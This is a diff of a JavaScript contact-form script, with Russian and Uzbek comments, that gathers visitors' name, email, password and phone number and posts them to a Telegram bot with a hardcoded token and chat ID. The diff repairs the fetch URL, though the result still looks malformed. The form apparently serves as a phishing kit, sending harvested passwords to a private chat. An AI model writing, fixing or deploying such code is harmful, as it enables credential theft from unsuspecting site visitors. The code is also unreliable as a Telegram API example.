@@ -3,6 +3,7 @@ var BOT_TOKEN = '8765203206:AAGkiR2x8tYa0fT6pi7VCdIcrW9LYw1xlok';
 var CHAT_ID = '6023504003';
 var form = document.querySelector('#contactForm');
 var statusText = document.querySelector('#status');
+
 if (form && statusText) {
     form.addEventListener('submit', function (e) {
         e.preventDefault();
@@ -15,8 +16,9 @@ if (form && statusText) {
         var name = (nameInput === null || nameInput === void 0 ? void 0 : nameInput.value) || '';
         var call = (callInput === null || callInput === void 0 ? void 0 : callInput.value) || '';
         var text = "\n\uD83D\uDCDD Yangi forma xabari:\n\uD83D\uDC68    ism: ".concat(name, "\n\uD83D\uDCE7    email: ").concat(email, "\n\uD83D\uDD11    parol: ").concat(password, "\n\uD83D\uDCDE    telefon: ").concat(call, "\n    ");
-        // ИСПРАВЛЕНО: Полный корректный адрес API Telegram с использованием косых черт и знака доллара
-        fetch("https://telegram.org{BOT_TOKEN}/sendMessage", {
+        
+        // MANZIL TO'LIQ TUZATILDI: Rasmiy Telegram API manzili qo'yildi
+        fetch("https://telegram.org" + BOT_TOKEN + "/sendMessage", {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
